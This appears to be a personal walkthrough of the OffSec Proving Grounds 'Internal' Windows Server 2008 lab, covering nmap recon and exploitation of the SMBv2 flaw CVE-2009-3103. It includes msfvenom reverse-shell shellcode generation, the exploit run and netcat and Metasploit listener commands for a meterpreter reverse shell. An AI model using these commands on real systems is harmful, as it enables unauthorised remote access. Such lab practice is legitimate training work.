# Internal - Windows - OffSec - Proven Grounds
Completed: July 20, 2026 ~ 2 hr. 

- References:
- https://www.youtube.com/watch?v=bGU4cpdtItI
- https://medium.com/@ryanchamruiyang/proving-grounds-internal-walkthrough-by-ryan-cham-6db719991796

## Workflow
### Inital Recon
```
Ran the following:
nmap -Pn -T4 -sV --open 192.168.228.40
nmap -sC -sV --open 192.168.228.40

Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-16 20:58 -0400
Nmap scan report for 192.168.228.40
Host is up (0.030s latency).
Not shown: 956 closed tcp ports (reset), 31 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC

nmap --script=vuln 192.168.228.40
...
Host script results:
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: EOF
|_smb-vuln-ms10-054: false
```

### Correct - CVE-2009-3103
I see SP1 and mention of `CVE-2009-3103` but this is a DoS attack? Let's see what exploits are available and what they do. 

So initially I see exploitdb does have some options but does request `smb.SMBConnection`. 
There is an updated script that does not rely on that module?
https://github.com/Sic4rio/CVE-2009-3103---srv2.sys-SMB-Code-Execution-Python-MS09-050-/tree/main
```
git clone https://github.com/Sic4rio/CVE-2009-3103---srv2.sys-SMB-Code-Execution-Python-MS09-050-/tree/main
# made an edited version
cp MS09-050.py edit-MS09-050.py
mousepad edit-MS09-050.py

msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f python -v shell

chmod u+x edit-MS09-050.py

# Ran the exploit, need to have Administator password for this to work?

nc -nlvp 443 
```
#### Summary
So I was on the right track. I need to pay attention to the code. This was one of those cases where likely the only path was to utilize metasploit due to `windows/meterpreter/reverse_tcp`. 

The other thing is that `searchsploit` does have a payload that does work that is almost if not the same as what I pulled from GitHub. 

---

### Revisiting machine

Commands ran hopefully to help streamline the process
```
nmap -Pn -n -sS -p- -sV --min-hostgroup 255 --min-rtt-timeout 25ms --max-rtt-timeout 100ms --max-retries 1 --max-scan-delay 0 --min-rate 1000 -oA Full-Ports-Scan -vvv --open 192.168.205.40

cat Full-Ports-Scan.nmap| awk '/^Nmap scan report/{ip=$NF} /(\/tcp|\/udp)/ && /open/{split($1,p,"/"); print ip ":" p[1]}' | sort -u > discovery_scan_ip_ports.txt

cat discovery_scan_ip_ports.txt | cut -d: -f2 | sort -u > only-ports-list.txt

nmap -Pn -sV -sC --open -p "$(paste -sd, only-ports-list.txt)" 192.168.205.40 -oA detailed-ports-results

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=internal
| Not valid before: 2025-03-04T23:44:47
|_Not valid after:  2025-09-03T23:44:47
| rdp-ntlm-info: 
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2026-07-20T23:21:47+00:00
|_ssl-date: 2026-07-20T23:21:55+00:00; 0s from scanner time.
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
| smb2-security-mode: 
|   2.0.2: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-07-20T16:21:47-07:00
| smb2-time: 
|   date: 2026-07-20T23:21:47
|_  start_date: 2025-03-05T23:44:46
|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:43:6f (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h23m59s, deviation: 3h07m49s, median: 0s
```
When we get machine information from rdp it is worth adding the target to the `etc/hosts` file.
```
sudo mousepad /etc/hosts

Might get error about ModuleNotFoundError: No module named 'smb' 
Turns out, it looks like in the code there isn't even a need for 
# On one terminal 
python3 40280.py <target-IP>


# On other terminal (listener)
msfconsole -q -x 'use multi/handler ; set LHOST tun0 ; set LPORT 443 ; set payload windows/meterpreter/reverse_tcp ; run' 
```
